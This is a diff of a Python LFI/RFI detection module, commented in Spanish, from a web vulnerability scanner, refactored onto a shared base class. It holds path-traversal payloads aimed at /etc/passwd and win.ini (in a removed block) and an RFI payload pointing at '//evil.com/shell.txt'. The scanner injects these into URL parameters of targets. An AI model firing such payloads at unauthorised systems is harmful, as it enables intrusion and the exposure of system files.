@@ -3,30 +3,19 @@ Módulo de detección de LFI/RFI (Local/Remote File Inclusion).
 Detecta vulnerabilidades de inclusión de archivos locales y remotos.
 CVSS: 9.1 (Critical para RFI), 7.5 (High para LFI)
 """
-from core.base_module import VulnerabilityModule
-from core.logger import get_logger
-import requests
-import re
-import os
-import json
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
-from bs4 import BeautifulSoup
+from core.enhanced_base_module import EnhancedVulnerabilityModule
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 
-class LFIModule(VulnerabilityModule):
+class LFIModule(EnhancedVulnerabilityModule):
     """Módulo para detectar vulnerabilidades de LFI/RFI."""
     
     def __init__(self, config):
         super().__init__(config)
-        self.logger = get_logger("lfi_module")
-        self.findings = []
-        self.target_url = config.get("target_url")
-        self.report_dir = config.get("report_dir", "reports")
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        self.payloads = self._load_payloads()
+        # HTTPClient, PayloadManager, logger ya disponibles
+        
+        # Cargar payloads desde PayloadManager
+        self.payloads = self._load_payloads('lfi', max_count=15)
         
         # Signatures para detectar LFI exitoso
         self.lfi_signatures = {
@@ -51,50 +40,15 @@ class LFIModule(VulnerabilityModule):
             '//evil.com/shell.txt'
         ]
     
-    def _load_payloads(self):
-        """Carga payloads desde archivo."""
-        payloads = []
-        payload_file = "payloads/lfi.txt"
-        
-        try:
-            if os.path.exists(payload_file):
-                with open(payload_file, 'r', encoding='utf-8') as f:
-                    for line in f:
-                        line = line.strip()
-                        if line and not line.startswith('#'):
-                            payloads.append(line)
-            
-            # Payloads adicionales si el archivo está vacío
-            if not payloads:
-                payloads = [
-                    '../../../etc/passwd',
-                    '..\\..\\..\\windows\\win.ini',
-                    '../../../../etc/passwd',
-                    '..\\..\\..\\..\\windows\\win.ini',
-                    '../../../../../etc/passwd',
-                    '..\\..\\..\\..\\..\\windows\\win.ini',
-                    '/etc/passwd',
-                    'C:\\windows\\win.ini',
-                    '....//....//....//etc/passwd',
-                    '..../..../..../windows/win.ini',
-                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-                    '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini'
-                ]
-            
-            self.logger.info(f"Cargados {len(payloads)} payloads LFI")
-            return payloads
-        
-        except Exception as e:
-            self.logger.error(f"Error cargando payloads: {e}")
-            return []
-    
     def scan(self):
         """Detecta vulnerabilidades de LFI/RFI."""
         self.logger.info("=== Iniciando escaneo LFI/RFI ===")
         
         try:
-            # 1. Descubrir puntos de inyección
-            injection_points = self._discover_injection_points()
+            # 1. Descubrir puntos de inyección (método heredado con filtro)
+            lfi_keywords = ['file', 'path', 'page', 'include', 'doc', 'document', 
+                           'folder', 'root', 'pg', 'style', 'pdf', 'template']
+            injection_points = self._discover_injection_points(keywords=lfi_keywords)
             
             if not injection_points:
                 self.logger.info("No se encontraron puntos de inyección para LFI/RFI")
@@ -106,76 +60,29 @@ class LFIModule(VulnerabilityModule):
             # 3. Probar RFI (Remote File Inclusion)
             self._test_rfi(injection_points)
             
+            # 4. Exportar resultados (método heredado)
             self._export_results()
+            
             self.logger.info(f"Escaneo LFI/RFI completado: {len(self.findings)} hallazgos")
             
         except Exception as e:
             self.logger.error(f"Error en escaneo LFI/RFI: {e}")
-    
-    def _discover_injection_points(self):
-        """Descubre parámetros susceptibles a LFI/RFI."""
-        self.logger.info("Descubriendo puntos de inyección...")
-        
-        injection_points = []
-        
-        try:
-            response = self.session.get(self.target_url, timeout=10)
-            parsed_url = urlparse(self.target_url)
-            
-            # 1. Parámetros en URL
-            if parsed_url.query:
-                params = parse_qs(parsed_url.query)
-                
-                # Parámetros comunes para LFI
-                lfi_params = ['file', 'path', 'page', 'include', 'doc', 'document', 
-                             'folder', 'root', 'pg', 'style', 'pdf', 'template', 
-                             'php_path', 'document_root']
-                
-                for param in params.keys():
-                    if any(lfi_param in param.lower() for lfi_param in lfi_params):
-                        injection_points.append({
-                            'type': 'url_param',
-                            'param': param,
-                            'url': self.target_url,
-                            'original_value': params[param][0]
-                        })
-                        self.logger.info(f"Punto de inyección encontrado: {param}")
-            
-            # 2. Buscar en enlaces de la página
-            soup = BeautifulSoup(response.text, 'html.parser')
-            links = soup.find_all('a', href=True)
-            
-            for link in links[:20]:  # Limitar a 20 enlaces
-                href = link['href']
-                full_url = urljoin(self.target_url, href)
-                parsed = urlparse(full_url)
-                
-                if parsed.query:
-                    params = parse_qs(parsed.query)
-                    for param in params.keys():
-                        if any(lfi_param in param.lower() for lfi_param in ['file', 'path', 'page']):
-                            injection_points.append({
-                                'type': 'url_param',
-                                'param': param,
-                                'url': full_url,
-                                'original_value': params[param][0]
-                            })
-        
-        except Exception as e:
-            self.logger.error(f"Error descubriendo puntos de inyección: {e}")
-        
-        self.logger.info(f"Total puntos de inyección: {len(injection_points)}")
-        return injection_points
     
     def _test_lfi(self, injection_points):
         """Prueba Local File Inclusion."""
         self.logger.info("Probando LFI (Local File Inclusion)...")
         
         for point in injection_points:
-            param = point['param']
+            param = point['parameter']
             base_url = point['url']
             
-            for payload in self.payloads[:15]:  # Limitar payloads
+            # Evitar duplicados
+            test_key = f"{base_url}:{param}"
+            if test_key in self.tested_params:
+                continue
+            self.tested_params.add(test_key)
+            
+            for payload in self.payloads:
                 try:
                     # Construir URL con payload
                     parsed = urlparse(base_url)
@@ -188,32 +95,34 @@ class LFIModule(VulnerabilityModule):
                         parsed.params, new_query, parsed.fragment
                     ))
                     
-                    response = self.session.get(test_url, timeout=10)
+                    # Hacer request (método heredado)
+                    response = self._make_request(test_url)
+                    
+                    if not response:
+                        continue
                     
                     # Verificar si el payload fue exitoso
                     if self._is_lfi_vulnerable(response.text, payload):
-                        finding = {
-                            "type": "lfi",
-                            "severity": "high",
-                            "title": "LFI - Local File Inclusion",
-                            "cvss": 7.5,
-                            "url": test_url,
-                            "method": "GET",
-                            "parameter": param,
-                            "payload": payload,
-                            "description": f"Vulnerabilidad LFI detectada en parámetro '{param}'",
-                            "details": {
+                        # Añadir hallazgo (método heredado)
+                        self._add_finding(
+                            vulnerability="LFI - Local File Inclusion",
+                            severity="high",
+                            url=test_url,
+                            payload=payload,
+                            details={
                                 "injection_point": param,
                                 "payload_used": payload,
-                                "evidence": self._get_evidence(response.text)
-                            },
-                            "recommendation": "Validar y sanitizar todos los inputs de archivo. Usar whitelist de archivos permitidos. Evitar incluir archivos basados en input del usuario.",
-                            "references": [
-                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
-                                "https://cwe.mitre.org/data/definitions/98.html"
-                            ]
-                        }
-                        self.findings.append(finding)
+                                "evidence": self._get_evidence(response.text),
+                                "cvss": 7.5,
+                                "cwe": "CWE-98",
+                                "recommendation": "Validar y sanitizar todos los inputs de archivo. Usar whitelist de archivos permitidos. Evitar incluir archivos basados en input del usuario.",
+                                "references": [
+                                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
+                                    "https://cwe.mitre.org/data/definitions/98.html"
+                                ]
+                            }
+                        )
+                        
                         self.logger.warning(f"LFI detectado: {param} con payload {payload}")
                         break  # Solo reportar una vez por parámetro
                 
@@ -225,8 +134,14 @@ class LFIModule(VulnerabilityModule):
         self.logger.info("Probando RFI (Remote File Inclusion)...")
         
         for point in injection_points:
-            param = point['param']
+            param = point['parameter']
             base_url = point['url']
+            
+            # Evitar duplicados
+            test_key = f"{base_url}:{param}:rfi"
+            if test_key in self.tested_params:
+                continue
+            self.tested_params.add(test_key)
             
             for payload in self.rfi_payloads:
                 try:
@@ -241,33 +156,34 @@ class LFIModule(VulnerabilityModule):
                         parsed.params, new_query, parsed.fragment
                     ))
                     
-                    response = self.session.get(test_url, timeout=10)
+                    # Hacer request (método heredado)
+                    response = self._make_request(test_url)
+                    
+                    if not response:
+                        continue
                     
                     # Verificar si intenta hacer request externo
-                    # (En un escenario real, necesitarías un servidor controlado)
                     if self._is_rfi_vulnerable(response, payload):
-                        finding = {
-                            "type": "rfi",
-                            "severity": "critical",
-                            "title": "RFI - Remote File Inclusion",
-                            "cvss": 9.1,
-                            "url": test_url,
-                            "method": "GET",
-                            "parameter": param,
-                            "payload": payload,
-                            "description": f"Posible vulnerabilidad RFI detectada en parámetro '{param}'",
-                            "details": {
+                        # Añadir hallazgo (método heredado)
+                        self._add_finding(
+                            vulnerability="RFI - Remote File Inclusion",
+                            severity="critical",
+                            url=test_url,
+                            payload=payload,
+                            details={
                                 "injection_point": param,
                                 "payload_used": payload,
-                                "risk": "Permite ejecución remota de código arbitrario"
-                            },
-                            "recommendation": "CRÍTICO: Deshabilitar allow_url_include en PHP. Validar estrictamente todos los inputs. Usar whitelist de archivos locales únicamente.",
-                            "references": [
-                                "https://owasp.org/www-community/attacks/Remote_File_Inclusion",
-                                "https://cwe.mitre.org/data/definitions/98.html"
-                            ]
-                        }
-                        self.findings.append(finding)
+                                "risk": "Permite ejecución remota de código arbitrario",
+                                "cvss": 9.1,
+                                "cwe": "CWE-98",
+                                "recommendation": "CRÍTICO: Deshabilitar allow_url_include en PHP. Validar estrictamente todos los inputs. Usar whitelist de archivos locales únicamente.",
+                                "references": [
+                                    "https://owasp.org/www-community/attacks/Remote_File_Inclusion",
+                                    "https://cwe.mitre.org/data/definitions/98.html"
+                                ]
+                            }
+                        )
+                        
                         self.logger.critical(f"RFI detectado: {param} con payload {payload}")
                         break
                 
@@ -317,28 +233,9 @@ class LFIModule(VulnerabilityModule):
         for os_type, signatures in self.lfi_signatures.items():
             for signature in signatures:
                 if signature in response_text:
-                    # Extraer contexto
-                    idx = response_text.find(signature)
-                    snippet = response_text[max(0, idx-50):min(len(response_text), idx+100)]
+                    # Extraer contexto (método heredado)
+                    snippet = self._get_context_snippet(response_text, signature)
                     evidence.append(snippet)
                     break
         
         return evidence[:3]  # Máximo 3 evidencias
-    
-    def _export_results(self):
-        """Exporta los resultados a JSON."""
-        try:
-            os.makedirs(self.report_dir, exist_ok=True)
-            output_path = os.path.join(self.report_dir, "lfi_findings.json")
-            
-            with open(output_path, "w", encoding="utf-8") as f:
-                json.dump(self.findings, f, indent=2, ensure_ascii=False)
-            
-            self.logger.info(f"Resultados LFI/RFI exportados: {output_path}")
-        
-        except Exception as e:
-            self.logger.error(f"Error exportando resultados LFI: {e}")
-    
-    def get_results(self):
-        """Devuelve los hallazgos encontrados."""
-        return self.findings
